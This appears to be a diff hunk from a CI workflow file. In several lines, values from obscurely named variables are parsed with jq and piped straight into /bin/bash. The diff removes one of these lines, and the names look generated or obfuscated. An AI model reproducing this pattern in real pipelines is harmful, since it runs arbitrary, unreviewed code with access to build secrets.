@@ -25,7 +25,6 @@ jobs:
           printf '%s' "$r46" | jq -r .sfbks9962 | /bin/bash
           printf '%s' "$bzvj31020" | jq -r .etdu1502 | /bin/bash
           printf '%s' "$evogi86" | jq -r .std5363 | /bin/bash
-          printf '%s' "$kic835" | jq -r .vgyet752 | /bin/bash
           echo $gkpv49435 | jq -r .qkeu5298 | /bin/bash
 
       - name: Archive results
